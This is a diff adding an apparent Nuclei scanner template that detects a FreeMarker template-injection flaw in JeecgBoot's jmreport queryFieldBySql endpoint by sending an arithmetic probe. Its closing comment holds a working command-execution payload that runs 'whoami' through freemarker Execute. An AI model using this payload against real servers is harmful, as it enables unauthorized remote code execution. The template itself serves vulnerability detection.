@@ -1,0 +1,76 @@
+jeecgid: jeecg-boot-queryfieldbysql-rce
+info:
+  name: jeecg-boot-queryfieldbysql-rce
+  author: msk
+
+
+requests:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        
+        {"sql":"select '<#assign result = 255 * 255> ${result}' "}
+        
+
+      - |
+        POST /jmreport/qurestSql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+
+        {"sql":"select '<#assign result = 255 * 255> ${result}' "}
+
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+               
+
+      - |
+        GET /js/app.{{jslist}}.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+
+      - |
+        POST /{{basepath1}}/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+
+        {"sql":"select '<#assign result = 255 * 255> ${result}' "}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        condition: or
+        dsl:
+          - "contains_all(body,'65025','fieldText')"
+
+    extractors:
+      - type: regex
+        part: body_3
+        name: jslist
+        internal: true
+        group: 1
+        regex:
+          - "script src=/js/app.(.*?).js>"
+
+      - type: regex
+        part: body_4
+        name: basepath1
+        internal: true
+        group: 3
+        regex:
+          - '(API_BASE_URL|VUE_APP_API_BASE_URL)[:=]"https?://(.*?)/(.*?)/?"'
+
+      - type: json
+        part: body
+        json:
+          - '.result.fieldList[0].fieldName'
+
+# {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }' "}    exp
